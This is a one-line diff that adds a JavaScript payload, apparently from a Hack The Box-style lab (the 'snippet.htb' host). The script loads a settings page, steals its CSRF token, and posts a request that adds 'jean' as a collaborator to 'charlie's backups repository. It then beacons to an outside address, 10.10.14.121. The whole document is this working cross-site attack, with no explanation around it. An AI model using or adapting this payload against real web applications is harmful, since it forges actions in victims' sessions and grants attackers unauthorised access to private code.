@@ -1,0 +1,1 @@
+var u='http://dev.snippet.htb/charlie/backups/settings/collaboration';fetch(u).then(r => document.querySelector('meta[name=_csrf]').content).then(t => fetch(u,{method:'POST',headers: {'Content-Type':'application/x-www-form-urlencoded;'}, body:'collaborator=jean&_csrf='+t}).then(d => fetch('http://10.10.14.121/complete')))
